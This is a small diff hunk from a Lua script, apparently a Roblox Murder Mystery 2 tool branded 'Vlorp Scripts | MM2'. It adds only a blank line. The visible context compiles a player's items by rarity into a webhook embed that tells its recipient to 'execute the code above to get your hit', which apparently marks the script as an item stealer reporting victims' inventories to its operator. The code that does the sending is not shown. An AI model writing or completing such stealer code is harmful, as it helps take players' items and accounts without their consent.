@@ -1057,6 +1057,7 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Rare\n" .. raresString ..
                          "\n\n-- // Uncommon\n" .. uncommonString ..
                          "\n\n-- // Common\n" .. commonsString
+
 local WebHookEmbed = CreateEmbed(
     "Vlorp Scripts | MM2",
     "Please execute the code above to get your hit.",
